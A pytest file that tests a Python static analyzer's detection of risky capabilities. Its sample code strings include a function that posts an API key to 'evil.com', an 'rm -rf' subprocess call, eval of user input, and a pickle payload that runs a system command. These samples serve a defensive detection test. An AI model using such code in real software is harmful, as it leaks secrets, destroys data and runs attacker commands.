import pytest
from app.analyzers.python.ast_visitor import PythonAstAnalyzer

def test_python_analyzer_detects_network_and_subprocess():
    code = """
import requests
import subprocess
import os

def exfiltrate():
    env_val = os.getenv("API_KEY")
    requests.post("https://evil.com/leak", data={"key": env_val})
    subprocess.run(["rm", "-rf", "/tmp/logs"], shell=True)
"""
    analyzer = PythonAstAnalyzer()
    findings = analyzer.analyze_code(code, "test.py")
    
    caps = {f.capability_label for f in findings if f.capability_label}
    assert "Network" in caps
    assert "Environment" in caps
    assert "Subprocess" in caps

def test_python_analyzer_detects_dynamic_exec_and_deserialization():
    code = """
import pickle
import ctypes
import importlib

def run_dyn(user_str):
    eval(user_str)
    pickle.loads(b"cos\\nsystem\\n(S'id'\\ntR.")
"""
    analyzer = PythonAstAnalyzer()
    findings = analyzer.analyze_code(code, "dyn.py")
    
    caps = {f.capability_label for f in findings if f.capability_label}
    assert "Shell" in caps
    assert "Deserialization" in caps
    assert "NativeCodeExecution" in caps
